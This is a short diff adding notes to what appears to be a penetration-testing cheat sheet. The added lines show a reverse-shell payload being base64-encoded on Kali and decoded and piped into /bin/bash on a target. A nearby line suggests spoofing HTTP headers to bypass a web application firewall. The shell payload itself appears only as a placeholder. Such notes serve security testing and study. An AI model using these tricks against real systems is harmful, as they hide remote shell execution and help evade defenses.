@@ -1003,3 +1003,10 @@ https://github.com/0bfxgh0st/MMG-LO
 
 ## WAF Bypass
 Try changing HTTP headers, e.g. X-Forwarded-By to indicate that the request came locally  
+
+## Bash encoded shells
+	echo '<revshell payload>' | base64
+From kali  
+
+	echo '<base64payload>' | base64 -d | /bin/bash
+On target  
